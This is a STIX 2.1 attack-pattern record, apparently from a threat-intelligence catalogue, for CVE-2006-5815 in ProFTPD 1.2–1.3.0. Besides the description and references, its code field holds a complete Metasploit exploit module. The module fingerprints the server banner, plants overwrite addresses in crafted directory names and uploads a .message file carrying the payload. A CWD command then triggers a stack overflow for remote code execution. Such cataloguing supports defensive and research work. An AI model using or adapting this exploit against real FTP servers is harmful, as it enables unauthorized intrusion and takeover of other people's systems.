{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57375ac8-b769-49e5-a86e-44b7e6877af3",
    "created": "2024-08-14T16:59:53.505035Z",
    "modified": "2024-08-14T16:59:53.50504Z",
    "name": "ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)",
    "description": " This module exploits a stack-based buffer overflow in versions 1.2 through 1.3.0 of ProFTPD server. The vulnerability is within the \"sreplace\" function within the \"src/support.c\" file.  The off-by-one heap overflow bug in the ProFTPD sreplace function has been discovered about 2 (two) years ago by Evgeny Legerov. We tried to exploit this off-by-one bug via MKD command, but failed. We did not work on this bug since then.  Actually, there are exists at least two bugs in sreplace function, one is the mentioned off-by-one heap overflow bug the other is a stack-based buffer overflow via 'sstrncpy(dst,src,negative argument)'.  We were unable to reach the \"sreplace\" stack bug on ProFTPD 1.2.10 stable version, but the version 1.3.0rc3 introduced some interesting changes, among them:  1. another (integer) overflow in sreplace! 2. now it is possible to reach sreplace stack-based buffer overflow bug via the \"pr_display_file\" function! 3. stupid '.message' file display bug  So we decided to choose ProFTPD 1.3.0 as a target for our exploit. To reach the bug, you need to upload a specially created .message file to a writeable directory, then do \"CWD <writeable directory>\" to trigger the invocation of sreplace function.  Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message' file you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug.  The exploit is a part of VulnDisco Pack since Dec 2005. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ftp/proftp_sreplace.rb",
            "external_id": "proftp_sreplace.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5815"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2006/Nov/94"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2006/Nov/538"
        },
        {
            "source_name": "reference",
            "url": "http://bugs.proftpd.org/show_bug.cgi?id=2858"
        },
        {
            "source_name": "reference",
            "url": "http://proftp.cvs.sourceforge.net/proftp/proftpd/src/main.c?view=diff&r1=text&tr1=1.292&r2=text&tr2=1.294&diff_format=h"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in versions 1.2 through\n        1.3.0 of ProFTPD server. The vulnerability is within the \"sreplace\" function\n        within the \"src/support.c\" file.\n\n        The off-by-one heap overflow bug in the ProFTPD sreplace function has been\n        discovered about 2 (two) years ago by Evgeny Legerov. We tried to exploit\n        this off-by-one bug via MKD command, but failed. We did not work on this bug\n        since then.\n\n        Actually, there are exists at least two bugs in sreplace function, one is the\n        mentioned off-by-one heap overflow bug the other is a stack-based buffer overflow\n        via 'sstrncpy(dst,src,negative argument)'.\n\n        We were unable to reach the \"sreplace\" stack bug on ProFTPD 1.2.10 stable\n        version, but the version 1.3.0rc3 introduced some interesting changes, among them:\n\n        1. another (integer) overflow in sreplace!\n        2. now it is possible to reach sreplace stack-based buffer overflow bug via\n          the \"pr_display_file\" function!\n        3. stupid '.message' file display bug\n\n        So we decided to choose ProFTPD 1.3.0 as a target for our exploit.\n        To reach the bug, you need to upload a specially created .message file to a\n        writeable directory, then do \"CWD <writeable directory>\" to trigger the invocation\n        of sreplace function.\n\n        Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message'\n        file you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug.\n\n        The exploit is a part of VulnDisco Pack since Dec 2005.\n      },\n      'Author'         =>\n        [\n          'Evgeny Legerov <admin[at]gleg.net>',  # original .pm version (VulnDisco)\n          'jduck'   # Metasploit 3.x port\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-5815' ],\n          [ 'OSVDB', '68985' ],\n          [ 'BID', '20992' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2006/Nov/94' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2006/Nov/538' ],\n          [ 'URL', 'http://bugs.proftpd.org/show_bug.cgi?id=2858' ],\n          [ 'URL', 'http://proftp.cvs.sourceforge.net/proftp/proftpd/src/main.c?view=diff&r1=text&tr1=1.292&r2=text&tr2=1.294&diff_format=h' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'PrependChrootBreak' => true\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 900,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x25\",\n          'DisableNops'\t=>  'True',\n        },\n      'Platform'       => [ 'linux' ],\n      'Targets'        =>\n      [\n        #\n        # Automatic targeting via fingerprinting\n        #\n        [ 'Automatic Targeting', { 'auto' => true }  ],\n\n        #\n        # This special one comes first since we dont want its index changing.\n        #\n        [\t'Debug',\n          {\n            'Ret' => 0x41414242,\n            'PoolAddr' => 0x43434545\n          }\n        ],\n\n        #\n        # specific targets\n        #\n\n        [ \"ProFTPD 1.3.0 (source install) / Debian 3.1\",\n          {\n            # objdump -D proftpd|grep call|grep edx\n            'Ret' => 0x804afc8, # call edx\n            # nm proftpd|grep permanent_pool\n            'PoolAddr' => 0x80b59f8\n          }\n        ]\n\n      ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-11-26'))\n\n    register_options(\n      [\n        OptString.new('WRITABLE', [ true, 'A writable directory on the target host', '/incoming' ])\n      ])\n  end\n\n\n  def check\n    # NOTE: We don't care if the login failed here...\n    ret = connect\n\n    # We just want the banner to check against our targets..\n    vprint_status(\"FTP Banner: #{banner.strip}\")\n\n    status = CheckCode::Safe\n\n    if banner =~ /ProFTPD (1\\.[23]\\.[^ ])/i\n      ver = $1\n      maj,min,rel = ver.split('.')\n      relv = rel.slice!(0,1)\n      case relv\n      when '2'\n        status = CheckCode::Appears\n\n      when '3'\n        # 1.3.x before 1.3.1 is vulnerable\n        status = CheckCode::Appears\n        if rel.length > 0\n          if rel.to_i > 0\n            status = CheckCode::Safe\n          else\n            status = CheckCode::Appears\n          end\n        end\n      end\n    end\n\n    disconnect\n    return status\n  end\n\n\n  def exploit\n    connect_login\n\n    # Use a copy of the target\n    mytarget = target\n\n    if (target['auto'])\n      mytarget = nil\n\n      print_status(\"Automatically detecting the target...\")\n      if (banner and (m = banner.match(/ProFTPD (1\\.[23]\\.[^ ])/i))) then\n        print_status(\"FTP Banner: #{banner.strip}\")\n        version = m[1]\n      else\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      regexp = Regexp.escape(version)\n      self.targets.each do |t|\n        if (t.name =~ /#{regexp}/) then\n          mytarget = t\n          break\n        end\n      end\n\n      if (not mytarget)\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    else\n      print_status(\"Trying target #{mytarget.name}...\")\n      if banner\n        print_status(\"FTP Banner: #{banner.strip}\")\n      end\n    end\n\n    #puts \"attach and press any key\"; bleh = $stdin.gets\n    res = send_cmd(['CWD', datastore['WRITABLE']])\n\n    pwd = send_cmd(['PWD'])\n    if pwd !~ /257\\s\\\"(.+)\\\"/\n      fail_with(Failure::Unknown, \"Unable to get current working directory\")\n    end\n    pwd = $1\n    pwd << \"/\" if pwd[-1,1] != \"/\"\n\n    dir1 = \"A\" * (251 - pwd.length)\n    res = send_cmd(['MKD', dir1])\n\n    res = send_cmd(['CWD', dir1])\n\n    res = send_cmd(['PWD'])\n\n    dir2 = \"B\" * 64\n    dir2 << [mytarget.ret].pack('V')\n    dir2 << [mytarget['PoolAddr'] - 4].pack('V')\n    dir2 << \"\\xcc\" * 28\n\n    res = send_cmd(['DELE', \"#{dir2}/.message\"])\n    res = send_cmd(['DELE', \"250\"])\n    res = send_cmd(['RMD', dir2])\n\n    filedata = ''\n    filedata << 'A'\n    filedata << \"\\x66\\x81\\xc2\\x5e\\x13\\x52\\xc3\"; # add $0x135e, %dx; push %edx; ret\n    filedata << \"\\x25C\" * 11\n    filedata << 'A'\n    filedata << payload.encoded\n    filedata << rand_text_alphanumeric(900 - payload.encoded.length)\n    filedata << \"\\x25\\x43\\x41\" * 10\n\n    res = send_cmd(['MKD', dir2])\n    res = send_cmd_data(['PUT', \"#{dir2}/.message\"], filedata, 'I')\n\n    # Trigger sreplace overflow\n    res = send_cmd(['CWD', dir2])\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-26",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}